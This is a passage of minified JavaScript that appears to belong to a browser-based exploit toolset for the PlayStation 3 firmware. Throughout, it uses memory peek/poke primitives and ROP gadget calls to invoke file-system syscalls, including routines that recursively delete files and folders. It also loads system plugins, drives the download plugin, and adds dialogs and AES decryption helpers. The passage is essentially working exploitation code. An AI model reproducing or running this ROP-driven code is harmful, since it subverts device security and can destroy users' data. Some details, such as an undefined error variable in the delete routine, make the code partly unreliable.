            if (0 !== helper.sctx.scanQ.length()) helper.sctx.currentfd < 0 ? (alert("scan_dir processing start"), helper.worker.fe || (helper.worker.fe = new workerThread("BGTOOLSET_WKR_FE"), helper.worker.fe) ? (helper.sctx.tls = helper.worker.fe.getTLS().offset, alert("BGTOOLSET_WKR_FE created"), e = helper.sctx.scanQ.first(), helper.memory.upoke32(helper.sctx.tls, 0), helper.memory.upoke32(helper.sctx.tls + 4, 0), helper.memory.upokes(helper.sctx.tls + 8, e, !0), alert("Queueing opendir"), helper.worker.fe.run(vsyscall32(helper.sc_fs_opendir, helper.sctx.tls + 8, helper.sctx.tls) + vstore_r3_word(helper.sctx.tls + 4), "Scanning Directory " + e, function() {
                alert("opendir")
            }, function() {
                0 < helper.memory.upeek32(helper.sctx.tls + 4) ? (alert("opendir failed: " + helper.sctx.scanQ.first()), helper.sctx.scanQ.remove(), alert("Continue with next entry: " + helper.sctx.scanQ.first())) : (helper.sctx.currentfd = helper.memory.upeek32(helper.sctx.tls), alert("opendir done fd: 0x" + helper.sctx.currentfd.toString(16) + " " + helper.sctx.scanQ.first()), helper.comp.sfread = vsyscall32(helper.sc_fs_readdir, helper.sctx.currentfd, helper.sctx.tls + 32, helper.sctx.tls) + syscall32(helper.sc_fs_readdir, helper.sctx.currentfd, helper.sctx.tls + 292, helper.sctx.tls + 8) + syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.sctx.tls + 552, helper.sctx.tls + 16) + syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.sctx.tls + 812, helper.sctx.tls + 24)), delete_dir()
            })) : alert("FE Worker Thread Creation failed!")) : helper.worker.fe.run(helper.sctx.sfread, "Scanning Directory Item " + (helper.sctx.todoFolderQ.length() + helper.sctx.todoFileQ.length()).toString(), function() {
                alert("readdir")
            }, function() {
                for (var e = helper.memory.upeeks(helper.sctx.tls, 1072), r = 0; r < 4; r++) {
                    var t = 260 * r + 32;
                    if (0 === parseInt(e.substr(2 * (8 * r + 4), 8), 16)) return void helper.worker.fe.run(vsyscall32(helper.sc_fs_closedir, helper.sctx.currentfd), "Scan Directory Close", function() {
                        alert("closedir")
                    }, function() {
                        helper.sctx.currentfd = -1, helper.sctx.scanQ.remove(), delete_dir()
                    });
                    var s = e.substr(2 * (2 + t), 2 * parseInt(e.substr(2 * (1 + t), 2), 16)).fromAscii();
                    0 !== s.length && "." !== s && ".." !== s && (2 === (t = parseInt(e.substr(2 * t, 2), 16)) ? helper.sctx.todoFileQ.add(helper.sctx.scan_base + "/" + s) : 1 === t && (helper.sctx.todoFolderQ.add(helper.sctx.scan_base + "/" + s), helper.sctx.scanQ.add(helper.sctx.scan_base + "/" + s)))
                }
                delete_dir()
            });
            else {
                var e = helper.sctx.todoFileQ.length(),
                    r = 256 <= e ? 256 : e,
                    e = helper.sctx.todoFolderQ.length(),
                    t = 256 <= e ? 256 : e;
                t -= r;
                for (var s = "", o = 0; o < r; o++) helper.memory.upokes(helper.sctx.tls + 256 * o, helper.sctx.todoFileQ.last(), !0), s += vsyscall32(helper.sc_fs_unlink, helper.sctx.tls + 256 * o), helper.sctx.todoFileQ.removeLast();
                for (o = 0; o < t; o++) helper.memory.upokes(helper.sctx.tls + 256 * o, helper.sctx.todoFolderQ.last(), !0), s += vsyscall32(helper.sc_fs_rmdir, helper.sctx.tls + 256 * o), helper.sctx.todoFolderQ.removeLast();
                helper.worker.fe.run(s, "Deleting Items", function() {}, function() {
                    0 === helper.sctx.todoFileQ.length() && 0 === helper.sctx.todoFolderQ.length() ? "function" == typeof helper.sctx.cb && helper.sctx.cb({
                        Error: 0 < ret ? "Unlinking " + helper.sctx.scan_base + " Error" : "",
                        Code: 0 < ret ? ret : 0,
                        Path: helper.sctx.scan_base
                    }) : delete_dir()
                })
            }
    },
    scan_dir = function(a, i) {
        if (helper.sctx && helper.sctx.scanQ)
            if (0 !== helper.sctx.scanQ.length()) {
                var e;
                helper.sctx.currentfd < 0 ? (alert("scan_dir processing start"), helper.worker.fe || (helper.worker.fe = new workerThread("BGTOOLSET_WKR_FE"), helper.worker.fe) ? (helper.sctx.tls = helper.worker.fe.getTLS().offset, alert("BGTOOLSET_WKR_FE created with TLS: 0x" + helper.sctx.tls.toString(16)), e = helper.sctx.scanQ.first(), helper.memory.upoke32(helper.sctx.tls, 0), helper.memory.upoke32(helper.sctx.tls + 4, 0), helper.memory.upokes(helper.sctx.tls + 8, e, !0), alert("Queueing opendir"), helper.worker.fe.run(vsyscall32(helper.sc_fs_opendir, helper.sctx.tls + 8, helper.sctx.tls) + vstore_r3_word(helper.sctx.tls + 4), "Scanning Directory " + e, function() {
                    alert("opendir")
                }, function() {
                    0 < helper.memory.upeek32(helper.sctx.tls + 4) ? (alert("opendir failed: " + helper.sctx.scanQ.first()), helper.sctx.scanQ.remove(), alert("Continue with next entry: " + helper.sctx.scanQ.first())) : (helper.sctx.currentfd = helper.memory.upeek32(helper.sctx.tls), alert("opendir done fd: 0x" + helper.sctx.currentfd.toString(16) + " " + helper.sctx.scanQ.first()), helper.sctx.sfread = vcall_subByOpd(helper.vshgadgets_box.sys_fs_cellFsGetDirectoryEntries_opd_addr, helper.sctx.currentfd, helper.sctx.tls + 16, 312, helper.sctx.tls) + vcall_subByOpd(helper.vshgadgets_box.sys_fs_cellFsGetDirectoryEntries_opd_addr, helper.sctx.currentfd, helper.sctx.tls + 328, 312, helper.sctx.tls + 4) + vcall_subByOpd(helper.vshgadgets_box.sys_fs_cellFsGetDirectoryEntries_opd_addr, helper.sctx.currentfd, helper.sctx.tls + 640, 312, helper.sctx.tls + 8) + vcall_subByOpd(helper.vshgadgets_box.sys_fs_cellFsGetDirectoryEntries_opd_addr, helper.sctx.currentfd, helper.sctx.tls + 952, 312, helper.sctx.tls + 12)), scan_dir(a, i)
                })) : alert("FE Worker Thread Creation failed!")) : helper.worker.fe.run(helper.sctx.sfread, "Scanning Directory Item " + (helper.sctx.todoFolderQ.length() + helper.sctx.todoFileQ.length()).toString(), function() {
                    alert("readdir")
                }, function() {
                    for (var e = helper.memory.upeeks(helper.sctx.tls, 1264), r = 0; r < 4; r++) {
                        var t = 312 * r + 16;
                        if (0 === parseInt(e.substr(4 * r * 2, 8), 16)) return void helper.worker.fe.run(vsyscall32(helper.sc_fs_closedir, helper.sctx.currentfd), "Scan Directory Close", function() {
                            alert("closedir")
                        }, function() {
                            helper.sctx.currentfd = -1, helper.sctx.scanQ.remove(), scan_dir(a, i)
                        });
                        var s, o, l, n = e.substr(2 * (54 + t), 2 * parseInt(e.substr(2 * (53 + t), 2), 16)).fromAscii();
                        0 !== n.length && "." !== n && ".." !== n && (s = parseInt(e.substr(2 * (52 + t), 2), 16), o = UInt64(e.substr(2 * (28 + t), 16)), l = UInt64(e.substr(2 * (20 + t), 16)), parseInt(e.substr(2 * t, 8), 16), 2 !== s || a ? 1 === s && (helper.sctx.todoFolderQ.add({
                            Filename: n,
                            "File Type": "dir",
                            Preview: "test/images/fileicons/_Open.png",
                            Path: helper.sctx.scanQ.first() + "/" + n + "/",
                            Error: "No error",
                            Code: 0,
                            Properties: {
                                "Date Created": o.toString(16),
                                "Date Modified": l.toString(16),
                                Width: null,
                                Height: null,
                                Size: null
                            }
                        }), i && helper.sctx.scanQ.add(helper.sctx.scanQ.first() + "/" + n)) : (t = UInt64(e.substr(2 * (36 + t), 16)), helper.sctx.todoFileQ.add({
                            Filename: n,
                            "File Type": n.substr(n.lastIndexOf(".")),
                            Preview: "test/images/fileicons/default.png",
                            Path: helper.sctx.scanQ.first() + "/" + n,
                            Error: "No error",
                            Code: 0,
                            Properties: {
                                "Date Created": o.toString(16),
                                "Date Modified": l.toString(16),
                                Width: "0",
                                Height: "0",
                                Size: t.toString(16)
                            }
                        }), helper.sctx.totalSize = helper.sctx.totalSize.add(t)))
                    }
                    scan_dir(a, i)
                })
            } else {
                var r, t;
                alert("scan_dir processing done"), helper.sctx.todoFolderQ = jQuery.unique(helper.sctx.todoFolderQ), helper.sctx.todoFileQ = jQuery.unique(helper.sctx.todoFileQ);
                var s = helper.sctx.todoFolderQ.length(),
                    o = helper.sctx.todoFileQ.length();
                if ("function" == typeof helper.sctx.cb) {
                    for (t = [], r = 0; r < s; r++) t[helper.sctx.todoFolderQ.get(r).Path] = helper.sctx.todoFolderQ.get(r);
                    for (r = 0; r < o; r++) t[helper.sctx.todoFileQ.get(r).Path] = helper.sctx.todoFileQ.get(r);
                    helper.sctx.cb(t)
                }
            }
    },
    play_soundOK = function() {
        return helper.sound_ok = 0 < helper.sound_ok ? helper.sound_ok : helper.heap.store("snd_trophy", !0), playRCOSound("system_plugin", "snd_trophy")
    },
    play_soundNG = function() {
        return helper.sound_ng = 0 < helper.sound_ng ? helper.sound_ng : helper.heap.store("snd_system_ng", !0), playRCOSound("system_plugin", "snd_system_ng")
    },
    playRCOSound = function(e, r) {
        r = "snd_trophy" === r ? helper.sound_ok : "snd_edy_ng" === r ? helper.sound_ng : helper.heap.store(r, !0), e = getPluginViewid(e);
        return e = 0 < e ? helper.rop.rrun(callsub(helper.vshgadgets_box.sub_bl_to_paf_B93AFE7E_addr, helper.vshgadgets_box.vtoc_addr, e, r, 1065353216, 0, 0, 0, helper.vshdata_storage, 0, 0, 128)) : 0
    },
    getPluginViewid = function(e) {
        var r = 0;
        return "system_plugin" === e ? (helper.system_plugin = 0 < helper.system_plugin ? helper.system_plugin : helper.heap.store("system_plugin", !0), r = helper.system_plugin) : "xmb_plugin" === e ? (helper.xmb_plugin = 0 < helper.xmb_plugin ? helper.xmb_plugin : helper.heap.store("xmb_plugin", !0), r = helper.xmb_plugin) : "edy_plugin" === e ? (helper.edy_plugin = 0 < helper.edy_plugin ? helper.edy_plugin : helper.heap.store("edy_plugin", !0), r = helper.edy_plugin) : "osk_plugin" === e ? (helper.osk_plugin = 0 < helper.osk_plugin ? helper.osk_plugin : helper.heap.store("osk_plugin", !0), r = helper.osk_plugin) : "explore_plugin" === e ? (helper.explore_plugin = 0 < helper.explore_plugin ? helper.explore_plugin : helper.heap.store("explore_plugin", !0), r = helper.explore_plugin) : "download_plugin" === e ? (helper.download_plugin = 0 < helper.download_plugin ? helper.download_plugin : helper.heap.store("download_plugin", !0), r = helper.download_plugin) : "webrender_plugin" === e && (helper.webbrowser_plugin = 0 < helper.webbrowser_plugin ? helper.webbrowser_plugin : helper.heap.store("webrender_plugin", !0), r = helper.webbrowser_plugin), 0 < r ? call(helper.vshgadgets_box.paf_F21655F3_opd_addr, r) : -1
    },
    getPluginInterface = function(e, r) {
        return call(helper.vshgadgets_box.paf_23AFB290_opd_addr, e, r)
    },
    getXMM0IF = function() {
        if (helper.xmm0_interface <= 0) {
            var e = getPluginViewid("xmb_plugin"),
                e = 0 < e ? getPluginInterface(e, 1481461040) : 0;
            return 0 < e ? (helper.xmm0_interface = e, 0) : (helper.xmm0_interface = 0, Logger.error("getXMM0IF: Failure to acquire xmb_plugin interface xmm0"), -1)
        }
    },
    getWBIF = function() {
        if (helper.webbrowser_plugin_interface <= 0) {
            var e = getPluginViewid("webrender_plugin"),
                e = 0 < e ? getPluginInterface(e, 1) : 0;
            return 0 < e ? (helper.webbrowser_plugin_interface = e, 0) : (helper.webbrowser_plugin_interface = 0, Logger.error("getWBIF: Failure to acquire webrender_plugin interface 1"), -1)
        }
    },
    getDLPIF = function() {
        if (helper.download_plugin_interface <= 0) {
            var e, r = getPluginViewid("download_plugin");
            r <= 0 ? (Logger.info("getDLPIF: loading download_plugin"), e = LoadPluginById(41, null), Logger.info("getDLPIF: LoadPluginById returned: 0x" + e.toString(16)), 0 !== e && 1 !== e && (sleep(1), e = LoadPluginById(41, null), Logger.info("getDLPIF: LoadPluginById returned: 0x" + e.toString(16))), sleep(2), r = 0 === e || 1 === e ? getPluginViewid("download_plugin") : 0) : Logger.info("getDLPIF: download_plugin already loaded"), Logger.info("getDLPIF: view: 0x" + r.toString(16));
            r = 0 < r ? getPluginInterface(r, 1) : 0;
            return 0 < r ? (Logger.info("getDLPIF: loaded download_plugin interface"), helper.download_plugin_interface = r, 0) : (helper.download_plugin_interface = 0, Logger.error("getDLPIF: failure to acquire download_plugin interface 1"), -1)
        }
    },
    getEXPIF = function() {
        if (helper.explore_plugin_interface <= 0) {
            var e, r = getPluginViewid("explore_plugin");
            r <= 0 && (e = LoadPluginById(2, null), sleep(1), r = 0 === e || 1 === e ? getPluginViewid("explore_plugin") : 0);
            r = 0 < r ? getPluginInterface(r, 1) : 0;
            return 0 < r ? (helper.explore_plugin_interface = r, 0) : (helper.explore_plugin_interface = 0, Logger.error("getEXPIF: Failure to acquire explore_plugin interface 1"), -1)
        }
    },
    wakeBrowser_sf = function() {
        return vcall_subByOpd(helper.memory.upeek32(helper.webbrowser_plugin_interface), 0)
    },
    DownloadStartBrowser_sf = function(e) {
        return vcall_subByOpd(helper.memory.upeek32(helper.webbrowser_plugin_interface + 56), e)
    },
    DownloadURL_sf = function(e, r) {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface + 20), 0, e, r)
    },
    setURL_sf = function(e) {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface + 4), e)
    },
    setPath_sf = function(e) {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface + 8), e)
    },
    DownloadselDestination_sf = function() {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface), 0)
    },
    DownloadselDestination2_sf = function() {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface + 60), 0)
    },
    DownloadselDevice_sf = function() {
        return vcall_subByOpd(helper.memory.upeek32(helper.download_plugin_interface + 68), 0)
    },
    downloadObject = function(e, r, t, s) {
        var o = "";
        this.log = "Download Operations:<br>Thread BGTOOLSET_DL created<br>URL: " + e + "<br>Path: " + r, o += DownloadURL_sf(e, r), this.sfd[0] = o
    },
    LoadPluginById = function(e, r) {
        return 0 === getXMM0IF() ? call(helper.memory.upeek32(helper.xmm0_interface + 12), e, r, 0) : -1
    },
    ClosePluginById = function(e, r) {
        return 0 === getXMM0IF() ? call(helper.memory.upeek32(helper.xmm0_interface + 20), e, r, 1) : -1
    },
    UnloadPluginById = function(e, r) {
        return helper.xmm0_interface = 0 < helper.xmm0_interface ? helper.xmm0_interface : getPluginInterface(getPluginViewid("xmb_plugin"), helper.heap.store("XMM0", !0)), call(helper.memory.upeek32(helper.xmm0_interface + 0), e, r)
    },
    clean_guiDialog = function() {
        $("#dg-text");
        $("#dg-confirm").dialog("close")
    },
    confirmDialog = function(e, r, t, s, o, l) {
        guiDialog([{
            text: "Нет",
            icon: "ui-icon-close",
            click: function(e, r) {
                o && $.Deferred().done(o).resolve(l), clean_guiDialog()
            }
        }, {
            text: "Да",
            icon: "ui-icon-check",
            click: function(e, r) {
                t && $.Deferred().done(t).resolve(s), clean_guiDialog()
            }
        }], e, r)
    },
    enableScanDialogButtons = function() {
        $("#dg-confirm").parent().find(".ui-dialog-buttonset").children().button("option", "disabled", !1)
    },
    setScanDialogContents = function(e) {
        $("#dg-confirm").parent().find(".ui-dialog-content").innerHTML = e
    },
    updateScanDialogCounts = function(e, r) {
        var t = $("#dg-confirm").parent();
        t.find("#focount").innerHTML = e, t.find("#ficount").innerHTML = r
    },
    confirmWaitScanDialog = function(e, r, t, s, o, l) {
        guiDialog([{
            text: "Нет",
            disabled: !0,
            icon: "ui-icon-close",
            click: function(e, r) {
                o && $.Deferred().done(o).resolve(l), clean_guiDialog()
            }
        }, {
            text: "Да",
            disabled: !0,
            icon: "ui-icon-check",
            click: function(e, r) {
                t && $.Deferred().done(t).resolve(s), clean_guiDialog()
            }
        }], "<p><span class='ui-icon ui-icon-alert' style='float:left; margin:12px 12px 20px 0;'></span>Processing folders: <span id='focount'></span> files: <span id='ficount'></span></p><p>" + e + "</p>", r)
    },
    infoDialog = function(e, r, t, s) {
        guiDialog([{
            text: "OK",
            icon: "ui-icon-check",
            click: function(e, r) {
                t && $.Deferred().done(t).resolve(s), clean_guiDialog()
            }
        }], e, r)
    },
    guiDialog = function(e, r, t) {
        var s = $("#dg-text"),
            o = $("#dg-confirm");
        s.html(r), o.dialog({
            resizable: !1,
            dialogClass: "no-close",
            title: t,
            height: "auto",
            show: {
                effect: "fade",
                duration: 1e3
            },
            hide: {
                effect: "fade",
                duration: 1e3
            },
            width: 500,
            modal: !0,
            buttons: e
        }), setTimeout(function() {
            var e = $("#dg-confirm").parent().find(".ui-dialog-buttonpane");
            e.hover(function() {
                e.find(".ui-button").blur()
            })
        }, 1)
    },
    toast = function(e, r, t, s, o) {
        return $().toastmessage("showToast", {
            inEffectDuration: 600,
            stayTime: 1e3 * t,
            text: e,
            position: "top-right",
            type: r,
            closeText: "",
            close: function() {
                s && $.Deferred().done(s).resolve(o)
            }
        })
    },
    getToken = function() {
        return token
    },
    getPlugin = function() {
        return btoa(navigator.plugins[0].filename)
    },
    getHMAC = function(e, r) {
        r = new sjcl.misc.hmac(sjcl.codec.hex.toBits(e), sjcl.hash.sha256).mac(sjcl.codec.hex.toBits(r));
        return sjcl.codec.hex.fromBits(r)
    },
    hkdf = function(e, r, t) {
        return sjcl.codec.hex.fromBits(sjcl.misc.hkdf(sjcl.codec.base64.toBits(e), 256, sjcl.codec.hex.toBits(r), t))
    },
    aes_decrypt = function(e, r, t, s) {
        if (s && s.length) throw new sjcl.exception.invalid("cbc data authentication error");
        if (128 !== sjcl.bitArray.bitLength(t)) throw new sjcl.exception.invalid("cbc iv must be 128 bits");
        if (127 & sjcl.bitArray.bitLength(r) || !r.length) throw new sjcl.exception.corrupt("cbc ciphertext must be a positive multiple of the block size");
        var o, l, n, a = sjcl.bitArray,
            i = a._xor4,
            p = [];
        for (s = s || [], o = 0; o < r.length; o += 4) l = r.slice(o, o + 4), n = i(t, e.decrypt(l)), p.splice(o, 0, n[0], n[1], n[2], n[3]), t = l;
        if (0 === (l = 255 & p[o - 1]) || 16 < l) throw new sjcl.exception.corrupt("pkcs#5 padding corrupt");
        if (n = 16843009 * l, !a.equal(a.bitSlice([n, n, n, n], 0, 8 * l), a.bitSlice(p, 32 * p.length - 8 * l, 32 * p.length))) throw new sjcl.exception.corrupt("pkcs#5 padding corrupt");
        return a.bitSlice(p, 0, 32 * p.length - 8 * l)
    },
    cbc_decrypt = function(e, r, t) {
        t = new sjcl.cipher.aes(sjcl.codec.hex.toBits(t)), r = aes_decrypt(t, sjcl.codec.hex.toBits(e), sjcl.codec.hex.toBits(r));
        return sjcl.codec.hex.fromBits(r)
    };